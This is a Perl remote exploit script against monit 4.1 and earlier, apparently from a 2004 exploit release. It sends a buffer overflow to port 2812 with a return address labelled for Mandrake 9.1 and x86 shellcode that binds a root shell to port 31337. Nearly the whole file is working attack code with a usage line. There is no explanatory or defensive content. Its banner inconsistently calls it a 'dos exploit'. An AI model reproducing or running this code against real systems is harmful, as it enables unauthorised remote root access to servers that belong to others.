#!/usr/bin/perl
#
# monit <= 4.1 remote root exploit
# coded by gsicht (09.04.04)
#

use IO::Socket::INET;
$socket = 0;

my $shellcode = # 8 + 88 = 96 bytes portbind 31337
"\x90\x90\x90\x90\x90\x90\x90\x90" .
"\x90\x90\x90\x90\x90\x90\x90\x90" .
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80" .
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80" .
"\x89\xc7\x52\x66\x68" .
"\x7a\x69" . # port 31337/tcp, change if needed
"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80" .
"\xb0\x66\xb3\x04\xcd\x80" .
"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80" .
"\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80" .
"\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";


print "\nmonit 4.1 dos exploit\n";
print "coded by gsicht\n\n";

if(@ARGV<1)
{
print "Usage: perl agate.pl <target>\n\n";
exit(0);
}

print "HOST:\t$ARGV[0]\n";
print "PORT:\t2812\n";


my $buffer = "B" x 284 . "\xcf\x89\xb3\x40" . $shellcode; # esp mandrake 9.1
#my $buffer = "A" x 284 . "XXXX" . "B" x 100; #dos and debug

print "connecting to server...\n";

$socket = IO::Socket::INET -> new( PeerAddr => $ARGV[0],
    PeerPort => 2812,
    Proto    => "tcp");
if(!defined($socket))
{
print "could not connect :-P\n";
sleep(1);
exit(0);
}

print "connected\n";
sleep(1);
print "sending string\n";
print $socket $buffer;

close $socket;
print "\ndosed!\n";
